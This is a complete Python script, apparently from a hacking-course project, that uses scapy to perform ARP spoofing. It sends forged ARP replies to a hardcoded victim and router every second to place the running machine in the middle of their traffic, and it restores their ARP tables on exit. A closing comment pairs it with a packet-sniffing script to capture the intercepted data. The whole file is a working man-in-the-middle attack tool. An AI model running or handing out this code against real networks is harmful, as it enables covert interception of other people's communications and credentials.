#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(trg_ip, spoof_ip):
    target_mac = get_mac(trg_ip)
    packet = scapy.ARP(op=2, pdst=trg_ip, hwdst=target_mac, psrc=spoof_ip)
    # op=2 for response, pdst=ip of victim, hwdst=mac of victim, psrc=ip of router
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    # hwsrc = (to restore, specify ip, else it would take ip of this machine)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.1.105"
router_ip = "192.168.1.1"
sent_count = 0

try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_count += 2
        print("\r[+] Packets sent: "+str(sent_count)),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("\n\n[!] Quitting ...")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)

# to get complete use of this project on other machines,
# open a terminal and run python /root/PycharmProjects/arp-spoofing/main.py
# open an other tab in terminal and run python /root/PycharmProjects/packet-sniffing/main.py

